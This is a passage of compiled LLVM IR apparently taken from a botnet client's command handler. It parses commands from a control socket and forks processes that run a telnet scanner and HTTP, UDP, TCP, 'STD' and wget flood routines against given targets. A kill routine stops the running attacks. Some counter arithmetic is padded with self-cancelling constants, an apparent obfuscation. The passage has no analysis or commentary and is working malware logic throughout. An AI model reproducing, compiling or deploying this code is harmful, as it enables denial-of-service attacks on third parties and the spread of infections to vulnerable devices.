  %152 = call i32 @atoi(i8* %151) #9
  store i32 %152, i32* %10, align 4
  %153 = call i32 @listFork()
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %160, label %155

; <label>:155:                                    ; preds = %144
  %156 = load i32, i32* @mainCommSock, align 4
  %157 = call i32 (i32, i8*, ...) @sockprintf(i32 %156, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.186, i32 0, i32 0))
  %158 = load i32, i32* %10, align 4
  %159 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %158, i32 %159)
  call void @_exit(i32 0) #11
  unreachable

; <label>:160:                                    ; preds = %144
  br label %717

; <label>:161:                                    ; preds = %138
  br label %162

; <label>:162:                                    ; preds = %161, %43
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.187, i32 0, i32 0)) #9
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %211, label %168

; <label>:168:                                    ; preds = %162
  %169 = load i32, i32* %3, align 4
  %170 = icmp slt i32 %169, 6
  br i1 %170, label %183, label %171

; <label>:171:                                    ; preds = %168
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 3
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #9
  %176 = icmp slt i32 %175, 1
  br i1 %176, label %183, label %177

; <label>:177:                                    ; preds = %171
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 5
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #9
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %177, %171, %168
  br label %717

; <label>:184:                                    ; preds = %177
  %185 = call i32 @listFork()
  %186 = icmp ne i32 %185, 0
  br i1 %186, label %187, label %188

; <label>:187:                                    ; preds = %184
  br label %717

; <label>:188:                                    ; preds = %184
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 1
  %191 = load i8*, i8** %190, align 8
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = load i8**, i8*** %4, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 3
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @atoi(i8* %197) #9
  %199 = trunc i32 %198 to i16
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 4
  %202 = load i8*, i8** %201, align 8
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 5
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #9
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 6
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #9
  call void @SendHTTP(i8* %191, i8* %194, i16 zeroext %199, i8* %202, i32 %206, i32 %210)
  call void @exit(i32 0) #12
  unreachable

; <label>:211:                                    ; preds = %162
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 0
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @strcmp(i8* %214, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)) #9
  %216 = icmp ne i32 %215, 0
  br i1 %216, label %260, label %217

; <label>:217:                                    ; preds = %211
  %218 = load i32, i32* %3, align 4
  %219 = icmp slt i32 %218, 6
  br i1 %219, label %232, label %220

; <label>:220:                                    ; preds = %217
  %221 = load i8**, i8*** %4, align 8
  %222 = getelementptr inbounds i8*, i8** %221, i64 3
  %223 = load i8*, i8** %222, align 8
  %224 = call i32 @atoi(i8* %223) #9
  %225 = icmp slt i32 %224, 1
  br i1 %225, label %232, label %226

; <label>:226:                                    ; preds = %220
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 5
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @atoi(i8* %229) #9
  %231 = icmp slt i32 %230, 1
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %226, %220, %217
  br label %717

; <label>:233:                                    ; preds = %226
  %234 = call i32 @listFork()
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %236, label %237

; <label>:236:                                    ; preds = %233
  br label %717

; <label>:237:                                    ; preds = %233
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 1
  %240 = load i8*, i8** %239, align 8
  %241 = load i8**, i8*** %4, align 8
  %242 = getelementptr inbounds i8*, i8** %241, i64 2
  %243 = load i8*, i8** %242, align 8
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 3
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @atoi(i8* %246) #9
  %248 = trunc i32 %247 to i16
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 4
  %251 = load i8*, i8** %250, align 8
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 5
  %254 = load i8*, i8** %253, align 8
  %255 = call i32 @atoi(i8* %254) #9
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 6
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #9
  call void @SendHTTPHEX(i8* %240, i8* %243, i16 zeroext %248, i8* %251, i32 %255, i32 %259)
  call void @exit(i32 0) #12
  unreachable

; <label>:260:                                    ; preds = %211
  %261 = load i8**, i8*** %4, align 8
  %262 = getelementptr inbounds i8*, i8** %261, i64 0
  %263 = load i8*, i8** %262, align 8
  %264 = call i32 @strcmp(i8* %263, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.189, i32 0, i32 0)) #9
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %309, label %266

; <label>:266:                                    ; preds = %260
  %267 = load i32, i32* %3, align 4
  %268 = icmp slt i32 %267, 6
  br i1 %268, label %281, label %269

; <label>:269:                                    ; preds = %266
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 3
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272) #9
  %274 = icmp slt i32 %273, 1
  br i1 %274, label %281, label %275

; <label>:275:                                    ; preds = %269
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 5
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 @atoi(i8* %278) #9
  %280 = icmp slt i32 %279, 1
  br i1 %280, label %281, label %282

; <label>:281:                                    ; preds = %275, %269, %266
  br label %717

; <label>:282:                                    ; preds = %275
  %283 = call i32 @listFork()
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %285, label %286

; <label>:285:                                    ; preds = %282
  br label %717

; <label>:286:                                    ; preds = %282
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 1
  %289 = load i8*, i8** %288, align 8
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 2
  %292 = load i8*, i8** %291, align 8
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 3
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #9
  %297 = trunc i32 %296 to i16
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 4
  %300 = load i8*, i8** %299, align 8
  %301 = load i8**, i8*** %4, align 8
  %302 = getelementptr inbounds i8*, i8** %301, i64 5
  %303 = load i8*, i8** %302, align 8
  %304 = call i32 @atoi(i8* %303) #9
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 6
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #9
  call void @SendHTTPTXT(i8* %289, i8* %292, i16 zeroext %297, i8* %300, i32 %304, i32 %308)
  call void @exit(i32 0) #12
  unreachable

; <label>:309:                                    ; preds = %260
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 0
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @strcmp(i8* %312, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.190, i32 0, i32 0)) #9
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %382, label %315

; <label>:315:                                    ; preds = %309
  %316 = load i32, i32* %3, align 4
  %317 = icmp slt i32 %316, 3
  br i1 %317, label %324, label %318

; <label>:318:                                    ; preds = %315
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 2
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #9
  %323 = icmp slt i32 %322, 1
  br i1 %323, label %324, label %325

; <label>:324:                                    ; preds = %318, %315
  br label %717

; <label>:325:                                    ; preds = %318
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 1
  %328 = load i8*, i8** %327, align 8
  store i8* %328, i8** %11, align 8
  %329 = load i8**, i8*** %4, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 2
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @atoi(i8* %331) #9
  store i32 %332, i32* %12, align 4
  %333 = load i8*, i8** %11, align 8
  %334 = call i8* @strstr(i8* %333, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %335 = icmp ne i8* %334, null
  br i1 %335, label %336, label %362

; <label>:336:                                    ; preds = %325
  %337 = load i8*, i8** %11, align 8
  %338 = call i8* @strtok(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %338, i8** %13, align 8
  br label %339

; <label>:339:                                    ; preds = %359, %336
  %340 = load i8*, i8** %13, align 8
  %341 = icmp ne i8* %340, null
  br i1 %341, label %342, label %361

; <label>:342:                                    ; preds = %339
  %343 = call i32 @listFork()
  %344 = icmp ne i32 %343, 0
  br i1 %344, label %359, label %345

; <label>:345:                                    ; preds = %342
  store i32 0, i32* %14, align 4
  br label %346

; <label>:346:                                    ; preds = %349, %345
  %347 = load i32, i32* %14, align 4
  %348 = icmp slt i32 %347, 10
  br i1 %348, label %349, label %356

; <label>:349:                                    ; preds = %346
  %350 = load i8*, i8** %11, align 8
  %351 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %350, i32 %351)
  %352 = load i32, i32* %14, align 4
  %353 = sub i32 0, 1
  %354 = sub i32 %352, %353
  %355 = add nsw i32 %352, 1
  store i32 %354, i32* %14, align 4
  br label %346

; <label>:356:                                    ; preds = %346
  %357 = load i32, i32* @mainCommSock, align 4
  %358 = call i32 @close(i32 %357)
  call void @_exit(i32 0) #11
  unreachable

; <label>:359:                                    ; preds = %342
  %360 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %360, i8** %13, align 8
  br label %339

; <label>:361:                                    ; preds = %339
  br label %381

; <label>:362:                                    ; preds = %325
  %363 = call i32 @listFork()
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %366

; <label>:365:                                    ; preds = %362
  br label %717

; <label>:366:                                    ; preds = %362
  store i32 0, i32* %15, align 4
  br label %367

; <label>:367:                                    ; preds = %370, %366
  %368 = load i32, i32* %15, align 4
  %369 = icmp slt i32 %368, 10
  br i1 %369, label %370, label %378

; <label>:370:                                    ; preds = %367
  %371 = load i8*, i8** %11, align 8
  %372 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %371, i32 %372)
  %373 = load i32, i32* %15, align 4
  %374 = add i32 %373, 1040401608
  %375 = add i32 %374, 1
  %376 = sub i32 %375, 1040401608
  %377 = add nsw i32 %373, 1
  store i32 %376, i32* %15, align 4
  br label %367

; <label>:378:                                    ; preds = %367
  %379 = load i32, i32* @mainCommSock, align 4
  %380 = call i32 @close(i32 %379)
  call void @_exit(i32 0) #11
  unreachable

; <label>:381:                                    ; preds = %361
  br label %382

; <label>:382:                                    ; preds = %381, %309
  %383 = load i8**, i8*** %4, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 0
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @strcmp(i8* %385, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0)) #9
  %387 = icmp ne i32 %386, 0
  br i1 %387, label %485, label %388

; <label>:388:                                    ; preds = %382
  %389 = load i32, i32* %3, align 4
  %390 = icmp slt i32 %389, 6
  br i1 %390, label %424, label %391

; <label>:391:                                    ; preds = %388
  %392 = load i8**, i8*** %4, align 8
  %393 = getelementptr inbounds i8*, i8** %392, i64 3
  %394 = load i8*, i8** %393, align 8
  %395 = call i32 @atoi(i8* %394) #9
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %424, label %397

; <label>:397:                                    ; preds = %391
  %398 = load i8**, i8*** %4, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 2
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @atoi(i8* %400) #9
  %402 = icmp eq i32 %401, -1
  br i1 %402, label %424, label %403

; <label>:403:                                    ; preds = %397
  %404 = load i8**, i8*** %4, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 4
  %406 = load i8*, i8** %405, align 8
  %407 = call i32 @atoi(i8* %406) #9
  %408 = icmp eq i32 %407, -1
  br i1 %408, label %424, label %409

; <label>:409:                                    ; preds = %403
  %410 = load i8**, i8*** %4, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 4
  %412 = load i8*, i8** %411, align 8
  %413 = call i32 @atoi(i8* %412) #9
  %414 = icmp sgt i32 %413, 1024
  br i1 %414, label %424, label %415

; <label>:415:                                    ; preds = %409
  %416 = load i32, i32* %3, align 4
  %417 = icmp eq i32 %416, 6
  br i1 %417, label %418, label %425

; <label>:418:                                    ; preds = %415
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 5
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #9
  %423 = icmp slt i32 %422, 1
  br i1 %423, label %424, label %425

; <label>:424:                                    ; preds = %418, %409, %403, %397, %391, %388
  br label %717

; <label>:425:                                    ; preds = %418, %415
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 1
  %428 = load i8*, i8** %427, align 8
  store i8* %428, i8** %16, align 8
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 2
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #9
  store i32 %432, i32* %17, align 4
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds i8*, i8** %433, i64 3
  %435 = load i8*, i8** %434, align 8
  %436 = call i32 @atoi(i8* %435) #9
  store i32 %436, i32* %18, align 4
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 4
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* %439) #9
  store i32 %440, i32* %19, align 4
  %441 = load i32, i32* %3, align 4
  %442 = icmp eq i32 %441, 6
  br i1 %442, label %443, label %448

; <label>:443:                                    ; preds = %425
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 5
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @atoi(i8* %446) #9
  br label %449

; <label>:448:                                    ; preds = %425
  br label %449

; <label>:449:                                    ; preds = %448, %443
  %450 = phi i32 [ %447, %443 ], [ 10, %448 ]
  store i32 %450, i32* %20, align 4
  store i32 32, i32* %21, align 4
  %451 = load i8*, i8** %16, align 8
  %452 = call i8* @strstr(i8* %451, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %453 = icmp ne i8* %452, null
  br i1 %453, label %454, label %473

; <label>:454:                                    ; preds = %449
  %455 = load i8*, i8** %16, align 8
  %456 = call i8* @strtok(i8* %455, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %456, i8** %22, align 8
  br label %457

; <label>:457:                                    ; preds = %470, %454
  %458 = load i8*, i8** %22, align 8
  %459 = icmp ne i8* %458, null
  br i1 %459, label %460, label %472

; <label>:460:                                    ; preds = %457
  %461 = call i32 @listFork()
  %462 = icmp ne i32 %461, 0
  br i1 %462, label %470, label %463

; <label>:463:                                    ; preds = %460
  %464 = load i8*, i8** %22, align 8
  %465 = load i32, i32* %17, align 4
  %466 = load i32, i32* %18, align 4
  %467 = load i32, i32* %19, align 4
  %468 = load i32, i32* %20, align 4
  %469 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %464, i32 %465, i32 %466, i32 %467, i32 %468, i32 %469)
  call void @_exit(i32 0) #11
  unreachable

; <label>:470:                                    ; preds = %460
  %471 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %471, i8** %22, align 8
  br label %457

; <label>:472:                                    ; preds = %457
  br label %484

; <label>:473:                                    ; preds = %449
  %474 = call i32 @listFork()
  %475 = icmp ne i32 %474, 0
  br i1 %475, label %476, label %477

; <label>:476:                                    ; preds = %473
  br label %717

; <label>:477:                                    ; preds = %473
  %478 = load i8*, i8** %16, align 8
  %479 = load i32, i32* %17, align 4
  %480 = load i32, i32* %18, align 4
  %481 = load i32, i32* %19, align 4
  %482 = load i32, i32* %20, align 4
  %483 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %478, i32 %479, i32 %480, i32 %481, i32 %482, i32 %483)
  call void @_exit(i32 0) #11
  unreachable

; <label>:484:                                    ; preds = %472
  br label %485

; <label>:485:                                    ; preds = %484, %382
  %486 = load i8**, i8*** %4, align 8
  %487 = getelementptr inbounds i8*, i8** %486, i64 0
  %488 = load i8*, i8** %487, align 8
  %489 = call i32 @strcmp(i8* %488, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.192, i32 0, i32 0)) #9
  %490 = icmp ne i32 %489, 0
  br i1 %490, label %596, label %491

; <label>:491:                                    ; preds = %485
  %492 = load i32, i32* %3, align 4
  %493 = icmp slt i32 %492, 6
  br i1 %493, label %524, label %494

; <label>:494:                                    ; preds = %491
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 3
  %497 = load i8*, i8** %496, align 8
  %498 = call i32 @atoi(i8* %497) #9
  %499 = icmp eq i32 %498, -1
  br i1 %499, label %524, label %500

; <label>:500:                                    ; preds = %494
  %501 = load i8**, i8*** %4, align 8
  %502 = getelementptr inbounds i8*, i8** %501, i64 2
  %503 = load i8*, i8** %502, align 8
  %504 = call i32 @atoi(i8* %503) #9
  %505 = icmp eq i32 %504, -1
  br i1 %505, label %524, label %506

; <label>:506:                                    ; preds = %500
  %507 = load i32, i32* %3, align 4
  %508 = icmp sgt i32 %507, 5
  br i1 %508, label %509, label %515

; <label>:509:                                    ; preds = %506
  %510 = load i8**, i8*** %4, align 8
  %511 = getelementptr inbounds i8*, i8** %510, i64 5
  %512 = load i8*, i8** %511, align 8
  %513 = call i32 @atoi(i8* %512) #9
  %514 = icmp slt i32 %513, 0
  br i1 %514, label %524, label %515

; <label>:515:                                    ; preds = %509, %506
  %516 = load i32, i32* %3, align 4
  %517 = icmp eq i32 %516, 7
  br i1 %517, label %518, label %525

; <label>:518:                                    ; preds = %515
  %519 = load i8**, i8*** %4, align 8
  %520 = getelementptr inbounds i8*, i8** %519, i64 6
  %521 = load i8*, i8** %520, align 8
  %522 = call i32 @atoi(i8* %521) #9
  %523 = icmp slt i32 %522, 1
  br i1 %523, label %524, label %525

; <label>:524:                                    ; preds = %518, %509, %500, %494, %491
  br label %717

; <label>:525:                                    ; preds = %518, %515
  %526 = load i8**, i8*** %4, align 8
  %527 = getelementptr inbounds i8*, i8** %526, i64 1
  %528 = load i8*, i8** %527, align 8
  store i8* %528, i8** %23, align 8
  %529 = load i8**, i8*** %4, align 8
  %530 = getelementptr inbounds i8*, i8** %529, i64 2
  %531 = load i8*, i8** %530, align 8
  %532 = call i32 @atoi(i8* %531) #9
  store i32 %532, i32* %24, align 4
  %533 = load i8**, i8*** %4, align 8
  %534 = getelementptr inbounds i8*, i8** %533, i64 3
  %535 = load i8*, i8** %534, align 8
  %536 = call i32 @atoi(i8* %535) #9
  store i32 %536, i32* %25, align 4
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 4
  %539 = load i8*, i8** %538, align 8
  store i8* %539, i8** %26, align 8
  %540 = load i32, i32* %3, align 4
  %541 = icmp eq i32 %540, 7
  br i1 %541, label %542, label %547

; <label>:542:                                    ; preds = %525
  %543 = load i8**, i8*** %4, align 8
  %544 = getelementptr inbounds i8*, i8** %543, i64 6
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @atoi(i8* %545) #9
  br label %548

; <label>:547:                                    ; preds = %525
  br label %548

; <label>:548:                                    ; preds = %547, %542
  %549 = phi i32 [ %546, %542 ], [ 10, %547 ]
  store i32 %549, i32* %27, align 4
  %550 = load i32, i32* %3, align 4
  %551 = icmp sgt i32 %550, 5
  br i1 %551, label %552, label %557

; <label>:552:                                    ; preds = %548
  %553 = load i8**, i8*** %4, align 8
  %554 = getelementptr inbounds i8*, i8** %553, i64 5
  %555 = load i8*, i8** %554, align 8
  %556 = call i32 @atoi(i8* %555) #9
  br label %558

; <label>:557:                                    ; preds = %548
  br label %558

; <label>:558:                                    ; preds = %557, %552
  %559 = phi i32 [ %556, %552 ], [ 0, %557 ]
  store i32 %559, i32* %28, align 4
  store i32 32, i32* %29, align 4
  %560 = load i8*, i8** %23, align 8
  %561 = call i8* @strstr(i8* %560, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %562 = icmp ne i8* %561, null
  br i1 %562, label %563, label %583

; <label>:563:                                    ; preds = %558
  %564 = load i8*, i8** %23, align 8
  %565 = call i8* @strtok(i8* %564, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %565, i8** %30, align 8
  br label %566

; <label>:566:                                    ; preds = %580, %563
  %567 = load i8*, i8** %30, align 8
  %568 = icmp ne i8* %567, null
  br i1 %568, label %569, label %582

; <label>:569:                                    ; preds = %566
  %570 = call i32 @listFork()
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %580, label %572

; <label>:572:                                    ; preds = %569
  %573 = load i8*, i8** %30, align 8
  %574 = load i32, i32* %24, align 4
  %575 = load i32, i32* %25, align 4
  %576 = load i8*, i8** %26, align 8
  %577 = load i32, i32* %28, align 4
  %578 = load i32, i32* %27, align 4
  %579 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %573, i32 %574, i32 %575, i8* %576, i32 %577, i32 %578, i32 %579)
  call void @_exit(i32 0) #11
  unreachable

; <label>:580:                                    ; preds = %569
  %581 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %581, i8** %30, align 8
  br label %566

; <label>:582:                                    ; preds = %566
  br label %595

; <label>:583:                                    ; preds = %558
  %584 = call i32 @listFork()
  %585 = icmp ne i32 %584, 0
  br i1 %585, label %586, label %587

; <label>:586:                                    ; preds = %583
  br label %717

; <label>:587:                                    ; preds = %583
  %588 = load i8*, i8** %23, align 8
  %589 = load i32, i32* %24, align 4
  %590 = load i32, i32* %25, align 4
  %591 = load i8*, i8** %26, align 8
  %592 = load i32, i32* %28, align 4
  %593 = load i32, i32* %27, align 4
  %594 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %588, i32 %589, i32 %590, i8* %591, i32 %592, i32 %593, i32 %594)
  call void @_exit(i32 0) #11
  unreachable

; <label>:595:                                    ; preds = %582
  br label %596

; <label>:596:                                    ; preds = %595, %485
  %597 = load i8**, i8*** %4, align 8
  %598 = getelementptr inbounds i8*, i8** %597, i64 0
  %599 = load i8*, i8** %598, align 8
  %600 = call i32 @strcmp(i8* %599, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.193, i32 0, i32 0)) #9
  %601 = icmp ne i32 %600, 0
  br i1 %601, label %658, label %602

; <label>:602:                                    ; preds = %596
  %603 = load i32, i32* %3, align 4
  %604 = icmp slt i32 %603, 4
  br i1 %604, label %617, label %605

; <label>:605:                                    ; preds = %602
  %606 = load i8**, i8*** %4, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 2
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #9
  %610 = icmp slt i32 %609, 1
  br i1 %610, label %617, label %611

; <label>:611:                                    ; preds = %605
  %612 = load i8**, i8*** %4, align 8
  %613 = getelementptr inbounds i8*, i8** %612, i64 3
  %614 = load i8*, i8** %613, align 8
  %615 = call i32 @atoi(i8* %614) #9
  %616 = icmp slt i32 %615, 1
  br i1 %616, label %617, label %618

; <label>:617:                                    ; preds = %611, %605, %602
  br label %717

; <label>:618:                                    ; preds = %611
  %619 = load i8**, i8*** %4, align 8
  %620 = getelementptr inbounds i8*, i8** %619, i64 1
  %621 = load i8*, i8** %620, align 8
  store i8* %621, i8** %31, align 8
  %622 = load i8**, i8*** %4, align 8
  %623 = getelementptr inbounds i8*, i8** %622, i64 2
  %624 = load i8*, i8** %623, align 8
  %625 = call i32 @atoi(i8* %624) #9
  store i32 %625, i32* %32, align 4
  %626 = load i8**, i8*** %4, align 8
  %627 = getelementptr inbounds i8*, i8** %626, i64 3
  %628 = load i8*, i8** %627, align 8
  %629 = call i32 @atoi(i8* %628) #9
  store i32 %629, i32* %33, align 4
  %630 = load i8*, i8** %31, align 8
  %631 = call i8* @strstr(i8* %630, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %632 = icmp ne i8* %631, null
  br i1 %632, label %633, label %649

; <label>:633:                                    ; preds = %618
  %634 = load i8*, i8** %31, align 8
  %635 = call i8* @strtok(i8* %634, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %635, i8** %34, align 8
  br label %636

; <label>:636:                                    ; preds = %646, %633
  %637 = load i8*, i8** %34, align 8
  %638 = icmp ne i8* %637, null
  br i1 %638, label %639, label %648

; <label>:639:                                    ; preds = %636
  %640 = call i32 @listFork()
  %641 = icmp ne i32 %640, 0
  br i1 %641, label %646, label %642

; <label>:642:                                    ; preds = %639
  %643 = load i8*, i8** %34, align 8
  %644 = load i32, i32* %32, align 4
  %645 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %643, i32 %644, i32 %645)
  call void @_exit(i32 0) #11
  unreachable

; <label>:646:                                    ; preds = %639
  %647 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %647, i8** %34, align 8
  br label %636

; <label>:648:                                    ; preds = %636
  br label %657

; <label>:649:                                    ; preds = %618
  %650 = call i32 @listFork()
  %651 = icmp ne i32 %650, 0
  br i1 %651, label %652, label %653

; <label>:652:                                    ; preds = %649
  br label %717

; <label>:653:                                    ; preds = %649
  %654 = load i8*, i8** %31, align 8
  %655 = load i32, i32* %32, align 4
  %656 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %654, i32 %655, i32 %656)
  call void @_exit(i32 0) #11
  unreachable

; <label>:657:                                    ; preds = %648
  br label %658

; <label>:658:                                    ; preds = %657, %596
  %659 = load i8**, i8*** %4, align 8
  %660 = getelementptr inbounds i8*, i8** %659, i64 0
  %661 = load i8*, i8** %660, align 8
  %662 = call i32 @strcmp(i8* %661, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i32 0, i32 0)) #9
  %663 = icmp ne i32 %662, 0
  br i1 %663, label %706, label %664

; <label>:664:                                    ; preds = %658
  store i32 0, i32* %35, align 4
  store i64 0, i64* %36, align 8
  br label %665

; <label>:665:                                    ; preds = %694, %664
  %666 = load i64, i64* %36, align 8
  %667 = load i64, i64* @numpids, align 8
  %668 = icmp ult i64 %666, %667
  br i1 %668, label %669, label %700

; <label>:669:                                    ; preds = %665
  %670 = load i32*, i32** @pids, align 8
  %671 = load i64, i64* %36, align 8
  %672 = getelementptr inbounds i32, i32* %670, i64 %671
  %673 = load i32, i32* %672, align 4
  %674 = icmp ne i32 %673, 0
  br i1 %674, label %675, label %693

; <label>:675:                                    ; preds = %669
  %676 = load i32*, i32** @pids, align 8
  %677 = load i64, i64* %36, align 8
  %678 = getelementptr inbounds i32, i32* %676, i64 %677
  %679 = load i32, i32* %678, align 4
  %680 = call i32 @getpid() #5
  %681 = icmp ne i32 %679, %680
  br i1 %681, label %682, label %693

; <label>:682:                                    ; preds = %675
  %683 = load i32*, i32** @pids, align 8
  %684 = load i64, i64* %36, align 8
  %685 = getelementptr inbounds i32, i32* %683, i64 %684
  %686 = load i32, i32* %685, align 4
  %687 = call i32 @kill(i32 %686, i32 9) #5
  %688 = load i32, i32* %35, align 4
  %689 = sub i32 %688, 662094842
  %690 = add i32 %689, 1
  %691 = add i32 %690, 662094842
  %692 = add nsw i32 %688, 1
  store i32 %691, i32* %35, align 4
  br label %693

; <label>:693:                                    ; preds = %682, %675, %669
  br label %694

; <label>:694:                                    ; preds = %693
  %695 = load i64, i64* %36, align 8
